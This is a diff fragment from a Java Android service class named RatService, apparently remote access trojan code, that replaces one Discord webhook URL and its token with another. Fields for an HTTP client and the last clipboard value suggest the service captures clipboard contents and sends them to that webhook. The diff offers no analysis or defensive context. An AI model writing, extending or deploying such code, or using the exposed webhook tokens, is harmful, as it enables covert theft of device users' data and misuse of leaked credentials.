@@ -18,7 +18,7 @@ import java.util.List;
 import okhttp3.*;
 
 public class RatService extends Service {
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566527107188785285/ytfcIg4MWuXkSLJ4vidZUF9UuYDZkzYPAWBtDaNTJbPbNMs51fpjJl6y1q0fVYg7yhUH";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566641052885061632/5z7tnnjZNykfW869bY_xahti6-RlQ4F-mTd0LYU52LK7oJLuQRpNYMaXpkRpsOiDSPn8";
     private OkHttpClient client = new OkHttpClient();
     private String lastClipboard = "";
     private boolean isRunning = true;
